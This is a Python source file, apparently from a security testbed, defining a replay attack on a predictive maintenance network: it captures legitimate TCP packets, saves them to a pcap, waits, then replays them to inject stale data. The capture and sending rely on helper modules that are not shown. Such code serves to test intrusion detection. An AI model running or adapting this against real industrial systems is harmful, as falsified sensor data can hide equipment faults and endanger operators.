import time

from core.base_attack import Attack

class ReplayAttack(Attack):
    """
    Implements a Layer-2 Replay Attack against the predictive maintenance network.
    
    Phases:
    1. Passively observe the network.
    2. Capture N legitimate TCP packets.
    3. Store them (in-memory & optionally .pcap).
    4. Wait for a configurable delay.
    5. Replay the captured packets bit-for-bit to simulate historical data injection.
    """

    def execute(self) -> None:
        self.logger.info("Replay Attack Started")
        
        capture_count = self.config_manager.get("capture_count", 5)
        replay_count = self.config_manager.get("replay_count", 10)
        delay_before_replay = self.config_manager.get("delay_before_replay", 30)
        replay_interval_ms = self.config_manager.get("replay_interval_ms", 500)

        # Phase 1, 2 & 3: Capture packets
        # Note: BPF filter is configured in main.py via config.json
        captured_packets = self.packet_capture.capture(count=capture_count)
        
        if not captured_packets:
            self.logger.error("No packets captured. Aborting attack.")
            self.logger.info("Replay Attack Finished (Failed)")
            return
            
        # Optional: Save capture to disk for forensic reproducibility
        self.packet_capture.save_pcap(filename=f"replay_base_{int(time.time())}.pcap")

        # Phase 4: Delay
        self.logger.info(f"Waiting {delay_before_replay} seconds before replaying...")
        time.sleep(delay_before_replay)

        # Phase 5: Replay
        self.logger.info(f"Replaying {len(captured_packets)} packets {replay_count} times...")
        self.packet_sender.replay_packets(
            packets=captured_packets,
            count=replay_count,
            interval_ms=replay_interval_ms
        )

        self.logger.info("Replay Attack Finished")
